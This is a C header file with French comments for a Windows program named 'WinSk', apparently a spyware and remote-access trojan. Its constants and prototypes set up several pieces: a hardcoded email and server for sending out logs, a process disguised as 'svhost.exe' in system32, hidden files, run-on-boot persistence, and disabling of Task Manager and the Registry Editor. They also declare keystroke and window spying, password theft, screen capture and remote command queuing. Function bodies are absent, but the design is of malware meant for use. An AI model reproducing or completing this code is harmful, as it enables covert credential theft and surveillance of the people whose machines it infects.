//=============================================================================
// Projet : WinSk
// Fichier : resources.h
//
//=============================================================================

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h> // -lws2_32
#include <wininet.h>  // -lwininet
#include <PowrProf.h> // -lpowrprof
#include <mmsystem.h> // -lwinmm
#include <commctrl.h> // -lcomctl32
#include <richedit.h>
#include "jpeglib.h" // -lgdi32, libjpeg.a


//=============================================================================
//                               Constantes
//=============================================================================

#define TEST_VERSION                1
#define HIDE_FILES                  TRUE

#define CRYPT_DECRYPT               FALSE
#define CRYPT_KEY                   956636 // @@ entier
//#define CRYPT_KEY                   "" // si chaine vide, le mdp par défaut de la fonction crypt sera utilisé

#define NOM_MUTEX                   "WinSkv7.3" // Le numéro de version doit changer pour chaque nouvelle version/nv changement

#define TAILLE_MAX_PATH             131
#define TAILLE_TMP                  2048

/* Dimensions Fenêtre & icon id & buttons id */
#define SCREEN_X              GetSystemMetrics(SM_CXSCREEN)
#define SCREEN_Y              GetSystemMetrics(SM_CYSCREEN)

#define L_FENETRE             560
#define H_FENETRE             360

#define PX_ECRAN              (SCREEN_X - L_FENETRE) / 2
#define PY_ECRAN              (SCREEN_Y - H_FENETRE) / 2

#define IDI_ICONE             100
#define IDI_CMD               101

#define IDB_SEND              200
#define IDB_CLEAR_CONSOLE     201
#define IDC_COMMANDELINE      202

/* Paramètres */
#define PARAMETRE_EMAIL                      "albatrosx95@gmail.com"
#define PARAMETRE_SERVER                     "kl"//"192.168.1.30"
//#define PARAMETRE_SERVER                     "localhost"//"127.0.0.1"
#define PARAMETRE_SERVER_PORT                50999
#define PARAMETRE_SERVER_RECONNECT_TIMEOUT   5000 // in milliseconds
//#define PARAMETRE_SERVER                     "81.192.53.15"
//#define PARAMETRE_SERVER_PORT                25
#define PARAMETRE_SLEEP_TIME                 15
#define PARAMETRE_RUN_ON_BOOT                TRUE

/* Paths */
#if (TEST_VERSION == 1)   /* Avec ou sans parenthèses (je préfère avec) */
   #define DEFAULT_DIRECTORY        "C:\\User"
   #define DEFAULT_PATH             "C:\\User\\Windows"
   #define SYSTEM_PATH              "C:"
   #define FILES_PATH               "C:"
   #define NOM_PROCESSUS            "WinSk.exe"
   #define NO_GUI                   FALSE
   #define NO_INFILTRATION          TRUE
   #define ENABLE_MULTI_INSTANCE    TRUE
   #define DISABLE_TASK_MANAGER     FALSE
   #define DISABLE_REGISTRY_EDITOR  FALSE
   #define PARAMETRE_STOP_ESPION    TRUE
   #define PARAMETRE_STOP_SENDER    TRUE
   #define PARAMETRE_STOP_ESP_MDP   FALSE
   #define PARAMETRE_STOP_CLIENT    FALSE
#elif (TEST_VERSION == 2)
   #define DEFAULT_DIRECTORY        "D:\\User"
   #define DEFAULT_PATH             "D:\\User\\Windows"
   #define SYSTEM_PATH              "D:"
   #define FILES_PATH               "D:"
   #define NOM_PROCESSUS            "ctfsys.exe" // ne pas changer le nom en version test 2 (la clé registre de démarrage sera fausse dû au deepfreez installé sur l'ordi.)
   #define NO_GUI                   TRUE
   #define NO_INFILTRATION          FALSE
   #define ENABLE_MULTI_INSTANCE    FALSE
   #define DISABLE_TASK_MANAGER     TRUE
   #define DISABLE_REGISTRY_EDITOR  TRUE
   #define PARAMETRE_STOP_ESPION    TRUE
   #define PARAMETRE_STOP_SENDER    TRUE
   #define PARAMETRE_STOP_ESP_MDP   FALSE
   #define PARAMETRE_STOP_CLIENT    FALSE
#else
   #define DEFAULT_DIRECTORY        "C:\\User"
   #define DEFAULT_PATH             "C:\\User\\Windows"
   #define SYSTEM_PATH              "C:\\WINDOWS\\system32"
   //#define SYSTEM_PATH              "C:\\Windows\\System32" /* Windows 7, ++ */
   #define FILES_PATH               SYSTEM_PATH
   #define NOM_PROCESSUS            "svhost.exe"
   #define NO_GUI                   TRUE
   #define NO_INFILTRATION          FALSE
   #define ENABLE_MULTI_INSTANCE    FALSE
   #define DISABLE_TASK_MANAGER     TRUE
   #define DISABLE_REGISTRY_EDITOR  TRUE
   #define PARAMETRE_STOP_ESPION    FALSE
   #define PARAMETRE_STOP_SENDER    FALSE
   #define PARAMETRE_STOP_ESP_MDP   TRUE
   #define PARAMETRE_STOP_CLIENT    FALSE
#endif

#define HOSTS_PATH               "C:\\WINDOWS\\system32\\drivers\\etc"

/* Noms fichiers log et configuration */
#define NOM_LOG_FILE             "lecteur.wsk"
#define NOM_CONFIG_FILE          "config.wsk"
#define NOM_RESET_FILE           "reset.wsk"
#define NOM_EXPLORE_FILE         "explore.wsk"
#define NOM_TASKS_FILE           "tasks.wsk"
//#define NOM_BOOTCMD_FILE         "boot.wsk"

/* EspionMdp (constantes de fonction) */
#define MAX_FENETRE_TAILLE         256
#define MAX_TMP                    512
#define MINI_LEN_USER              4
#define MINI_LEN_PASS              4

/* Threads number */
#if (NO_GUI == TRUE)
    #define NOMBRE_THREADS         3
#else
    #define NOMBRE_THREADS         4
#endif

#define NOMBRE_PARAMETRES          12

/* ToDo */
#define COMMANDE_SIZE              1024

/* fctavc.c */
#define ON                         1
#define OFF                        0
#define PATH_SIZE                  1024

typedef UINT (__stdcall *SEM)(UINT); // pour définir le type de variable SEM

//=============================================================================
//                            Variables globales
//=============================================================================

HINSTANCE hInst;

HWND hwFenetre, hwRichConsole;

WNDPROC oldProc;

HANDLE hThread[NOMBRE_THREADS];

BOOL TU_RECUPERE_FENETRE, MUST_RESET_LOG, DO_INFILTRATION, ALLOW_MULTI_INSTANCE;

BOOL CONNECTED_TO_SERVER;

SOCKET serverSock;

//=============================================================================
//                                Structures
//=============================================================================

typedef struct
{
   char Email[256];
   char Serveur[64];
   int Port;
   int TempDeReception;
   char RepertoireInfiltration[MAX_PATH];
   char NomProcessus[32];
   BOOL LancementAuDemarrage;
   BOOL StopEspion;
   BOOL StopSender;
   BOOL StopEspionMdp;
   BOOL StopClientThread;
   char Version[10];
}Parametres_Type;

Parametres_Type Parametres;

typedef struct s_ToDo
{
   int id;
   char commande[COMMANDE_SIZE];
   int time; // time left to execute
   struct s_ToDo *next;
}ToDo;

ToDo *ToDoList;

//=============================================================================
//                                Prototypes
//=============================================================================

/* main.c */
int lancerThreads();

/* todo.c */
ToDo* create_ToDo(ToDo *ToDoList, char *commande, int time);
int get_next_id(ToDo *ToDoList);
void free_ToDo(ToDo *ToDoList);
ToDo* add_ToDo(ToDo *ToDoList, char *commande, int time);
ToDo* push_ToDo(ToDo *ToDoList, char *commande, int time);
ToDo* pop_ToDo(ToDo *ToDoList);
ToDo* delete_ToDo(ToDo *ToDoList, int id);
void ToAlwaysDo();

/* gui.c */
LRESULT CALLBACK MainWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK editProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
void appendToRichConsole(char *title, const char *buffer);
void afficherSurRichConsole(char *texteAafficher);
void changerCouleurRichEdit(HWND hEdit, COLORREF couleur);
void changerCouleurSelectionRichEdit(HWND hEdit, CHARRANGE Selection, COLORREF couleur);
void lockGUI();
void unlockGUI();

/* fctavc.c */
char *user_name(short format);
char *get_time(short format);
BOOL ecrireDansFichier(char *path, char *nomFichier, char *buffer, BOOL ecraserAncien);
BOOL lireFichier(char *path, char *nomFichier, char *buffer, BOOL lire);
BOOL chargerParametres(BOOL depuisFichierDeConfiguration, char *path, char *nomFichier);
long tailleFichier(char *path, char *nomFichier, BOOL onlyPath);
char *recupNomDuProgramme(BOOL avecPath);
char *enMinuscule(char *chaine);
BOOL etatConnexion();
void afficherBureau(BOOL afficher);
void afficherBarreDesTaches(BOOL afficher);
void getPrivilege();
BOOL exploreDirectory(char *chemin);
void listeDesProcessus(char *liste, BOOL saveToFile);
BOOL arreterProgramme(char *ProcName);
BOOL ajouterModifierRegistre(char *option, LPCTSTR skChemin, HKEY racine, char *nom, int type, char *valeur);
void ajouterAuLog(char *buffer);
int nbrLignesFichier(char *path, char *nomFichier);
BOOL checkParametres(char *path, char *nomFichier);
BOOL sauvegarderParametres();
void tuerThread(HANDLE hThread);
BOOL cacherFichier(char *cheminFichier, char *nomFichier, BOOL onlyPath, BOOL hideAsSystemFile);
BOOL afficherFichier(char *cheminFichier, char *nomFichier, BOOL onlyPath);
char *enleverCaracteres(char *chaine, char char1, char char2);
BOOL recupererIp(char *serveur, char *adresseIp);
char *recupNomDuProgrammeDepuisPath(char *path);
BOOL verifierExistenceFichier(char *path);
void recupererIdentifiants(char *fenetre);
BOOL rechercherChaineDansChaine(char *chaine1, char *chaine2);
void extractProcessusNameFrom(char *nomProcessus);
BOOL ecraserFichier(char *path, char *nomFichier);
int strCharOccur(char *chaine, char caractere);
int setTaskManager(BOOL taskManagerState);
int setRegistryEditor(BOOL state);
BOOL is_file(const char* path);
BOOL is_dir(const char* path);

/* sendMail.c */
BOOL sendMail(char *emailTo, char *sujet, char *contenu);

/* client.c */
void init();
void end();
void app(char *name, char *adress, int port);

/* capture.c */
BOOL capturerEcran(char *fileName, UINT width, UINT height, UINT CompressionQuality, BOOL saveToBmp);
BOOL FillJpegBuffer(LPBYTE pBits, LPBITMAPINFOHEADER pbmih, int nSampsPerRow, JSAMPARRAY jsmpPixels);
BOOL JpegFromDib(LPBYTE pBits, LPBITMAPINFOHEADER pbmih, int nQuality, char *pathJpeg);

/* crypt.c */
void Crypt(TCHAR *inp, DWORD inplen, TCHAR* key, DWORD keylen);
void xor(char *szString, int szKey);

//=============================================================================
//                                 Threads
//=============================================================================

DWORD  WINAPI Espion(LPVOID lParam);
//DWORD  WINAPI EnvoyerLog(LPVOID lParam);
DWORD  WINAPI ClientSocket(LPVOID lParam);
DWORD  WINAPI EspionMdp(LPVOID lParam);
DWORD  WINAPI ToDoThread(LPVOID lParam);
